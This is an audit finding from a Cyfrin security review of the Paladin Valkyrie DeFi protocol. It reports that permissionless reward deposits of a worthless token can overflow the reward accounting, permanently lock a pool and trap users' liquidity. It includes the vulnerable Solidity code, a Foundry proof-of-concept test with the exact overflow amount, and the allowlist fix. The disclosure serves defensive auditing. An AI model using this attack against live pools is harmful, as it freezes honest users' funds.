---
tags:
  - lang/solidity
  - platform/cyfrin
  - has/github
  - severity/high
  - sector/dex
protocol: "[[Paladin Valkyrie]]"
auditors:
  - Draiakoo
report: "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-03-12-cyfrin-paladin-valkyrie-v2.0.md"
genome:
  - "[[reward-accounting]]"
  - "[[frozen-funds]]"
  - "[[direct-drain]]"
  - "[[known-pattern]]"
---
# Permissionless reward distribution can be abused to cause full denial of service and loss of funds for pools

- id: 61555
- impact: HIGH
- protocol: Paladin Valkyrie
- reporter: Draiakoo (Cyfrin)
- source: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-03-12-cyfrin-paladin-valkyrie-v2.0.md

## Summary


Title: Critical Bug in Reward Token Distribution System

Description:
The bug is related to the distribution of reward tokens, where anyone can create a worthless token and mint a large amount to be distributed. This can happen when the `_updateAllUserState()` function is triggered, which updates the new reward data for each of the tokens registered in the pool. The issue arises when the distribution amount is close to overflowing `uint96` at some point, which can permanently lock the pool and incentives. This bug can be exploited by a malicious user who can create tokens in a way that the distribution is close to overflowing `uint256`, triggering the attack.

Proof of Concept:
A test has been provided to demonstrate the bug, where a malicious user sets the `ratePerSec` to the maximum number that `uint96` can hold, resulting in a complete lock of the pool. This causes a loss of funds for honest users who are unable to remove their liquidity from the pool.

Impact:
The impact of this bug is critical, as it not only prevents further reward distribution but also results in a loss of funds for honest users.

Recommended Mitigation:
The distribution of reward tokens should be permissioned to prevent malicious tokens with no intrinsic value from being leveraged in such an attack.

Paladin:
The bug has been fixed by implementing a reward token allowlist.

Cyfrin:
The fix has been verified, and a reward token allowlist has been implemented to prevent such attacks.

## Details

**Description:** The distribution of reward token incentives is a permissionless action, meaning that anyone can create a worthless token and mint a large amount to be distributed. Whenever a notification is made from the incentive manager to the logic on some change within the pool, the `_updateAllUserState()` function is triggered. This updates the new reward data for each of the tokens that the pool has registered:

```solidity
function _updateAllUserState(IncentivizedPoolId id, address account) internal virtual {
    if(!userLiquiditySynced[id][account]) {
        _syncUserLiquidity(id, account);
        userLiquiditySynced[id][account] = true;
    }

    address[] memory _tokens = poolRewards[id];
    uint256 _length = _tokens.length;
    for (uint256 i; i < _length; i++) {
        _updateRewardState(id, _tokens[i], account);
    }
}

function _updateRewardState(IncentivizedPoolId id, address token, address account) internal virtual {
    // Sync pool total liquidity if not already done
    if(!poolSynced[id]) {
        _syncPoolLiquidity(id);
        poolSynced[id] = true;
    }

    RewardData storage _state = poolRewardData[id][token];
    uint96 newRewardPerToken = _newRewardPerToken(id, token).toUint96();
    _state.rewardPerTokenStored = newRewardPerToken;

    uint32 endTimestampCache = _state.endTimestamp;
    _state.lastUpdateTime = block.timestamp < endTimestampCache ? block.timestamp.toUint32() : endTimestampCache;

    // Update user state if an account is provided
    if (account != address(0)) {
        if(!userLiquiditySynced[id][account]) {
            _syncUserLiquidity(id, account);
            userLiquiditySynced[id][account] = true;
        }

        UserRewardData storage _userState = userRewardStates[id][account][token];
        _userState.accrued = _earned(id, token, account).toUint160();
        _userState.lastRewardPerToken = newRewardPerToken;
    }
}

function _newRewardPerToken(IncentivizedPoolId id, address token) internal view override returns (uint256) {
    uint256 _totalSupply = poolStates[id].totalLiquidity;
    RewardData memory _state = poolRewardData[id][token];
    if (_totalSupply == 0) return _state.rewardPerTokenStored;

    uint256 lastUpdateTimeApplicable = block.timestamp < _state.endTimestamp ? block.timestamp : _state.endTimestamp;

    return _state.rewardPerTokenStored
        + ((((lastUpdateTimeApplicable - _state.lastUpdateTime) * _state.ratePerSec) * UNIT) / _totalSupply);
}
```

If the distribution amount is close to overflowing `uint96` at some point, the locally scoped `_newRewardPerToken` to which `_state.rewardPerTokenStored` is assigned will overflow and the pool and incentives will be permanently locked.

While there was another issue reported on this overflow which can occur without the need for a malicious action when considering valuable tokens with low decimal precision, the recommended mitigation of increasing the size of the storage variable is not sufficient in this case. The malicious depositor is free to create tokens such that the token distribution can always be adjusted such that it is close to overflowing `uint256` to trigger this attack.

**Proof of Concept:** This following test should be placed within `BasicIncentiveLogic.t.sol`:

```solidity
function test_MaliciousToken() public {
    MockERC20 token3 = new MockERC20("TEST", "TEST", 18);
    token3.mint(address(this), 2 ** 128);
    token3.approve(address(logic), 2 ** 128);

    PoolId poolKey;
    IncentivizedPoolId poolId;
    address lpToken = address(7);

    poolKey = createPoolKey(address(1), address(2), 3000).toId();
    poolId = IncentivizedPoolKey({ id: poolKey, lpToken: lpToken }).toId();

    manager.setListedPool(poolId, true);
    logic.updateDefaultFee(0);

    address[] memory systems = new address[](1);
    systems[0] = address(logic);

    manager.notifyAddLiquidty(systems, poolKey, lpToken, user1, int256(1 ether));

    uint256 amountNotOverflow = 47917192688627071376575381162608000;
    uint256 duration = 1 weeks;

    logic.depositRewards(poolId, address(token3), amountNotOverflow, duration);

    // The malicious user sets the ratePerSec to the maximum number that uint96 can hold
    (, , uint256 ratePerSec, ) = logic.poolRewardData(poolId, address(token3));
    assertEq(ratePerSec, type(uint96).max);

    // After 2 seconds, the pool is completely locked because of overflowing when computing
    // the _newRewardPerToken and downcasting to uint96
    skip(2);

    // The pool is completely DoSd and the user that has liquidity in the pool lost all their
    // funds because they can not remove them
    vm.expectRevert();
    manager.notifyRemoveLiquidty(systems, poolKey, lpToken, user1, -int256(1 ether));
}
```

**Impact:** The impact is critical, since this not only prevents further reward distribution but also results in a loss of funds as honest users are prevented from removing their existing liquidity from the pool.

**Recommended Mitigation:** Reward distribution should be permissioned to such that malicious tokens with no intrinsic value that can artificially manipulate supply cannot be leveraged in such an attack.

**Paladin:** Fixed by commit [`b95ae97`](https://github.com/PaladinFinance/Valkyrie/pull/5/commits/b95ae97a67eca4e1e33cafc636ae3d3d3c1af088).

**Cyfrin:** Verified. A reward token allowlist has been implemented.

\clearpage
